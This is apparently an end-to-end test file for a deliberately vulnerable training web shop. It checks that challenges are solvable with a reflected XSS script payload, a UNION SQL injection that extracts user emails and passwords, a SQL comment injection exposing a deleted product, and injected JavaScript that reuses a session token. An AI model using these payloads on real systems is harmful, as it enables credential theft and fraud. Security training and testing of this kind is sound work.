const config = require('config')
const christmasProduct = config.get('products').filter(product => product.useForChristmasSpecialChallenge)[0]

describe('/#/search', () => {
  let searchQuery, searchButton

  beforeEach(() => {
    browser.get('/#/search') // not really necessary as search field is part of navbar on every dialog
    searchQuery = element(by.model('searchQuery'))
    searchButton = element(by.id('searchButton'))
  })

  describe('challenge "xss1"', () => {
    xit('search query should be susceptible to reflected XSS attacks', () => {
      const EC = protractor.ExpectedConditions

      searchQuery.sendKeys('<script>alert("XSS")</script>')
      searchButton.click()
      browser.wait(EC.alertIsPresent(), 5000, "'XSS' alert is not present")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('XSS')
        alert.accept()
      })
    })

    // protractor.expect.challengeSolved({challenge: 'XSS Tier 1'})
  })
})

describe('/rest/product/search', () => {
  describe('challenge "unionSqlI"', () => {
    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
      browser.driver.get(browser.baseUrl + '/rest/product/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
    })

    protractor.expect.challengeSolved({challenge: 'User Credentials'})
  })

  describe('challenge "christmasSpecial"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
      browser.driver.get(browser.baseUrl + '/rest/product/search?q=\'))--').then(() => {
        expect(browser.driver.getPageSource()).toContain(christmasProduct.name)
      })
    })

    xit('should be able to place Christmas product into shopping card by id', () => { // FIXME Fix XHTTP request
      browser.waitForAngularEnabled(false)
      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 201) { console.log("Success"); }}; xhttp.open("POST","http://localhost:3000/api/BasketItems/", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"BasketId": `${sessionStorage.getItem("bid")}`, "ProductId": ' + christmasProduct.id + ', "quantity": 1}));') // eslint-disable-line
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)

      browser.get('/#/basket')
      browser.wait(protractor.ExpectedConditions.presenceOf($('tr[data-ng-repeat="product in products"]')), 5000, 'Basket item list not present.') // eslint-disable-line no-undef
      element(by.id('checkoutButton')).click()
    })

    // protractor.expect.challengeSolved({challenge: 'Christmas Special'})
  })
})
  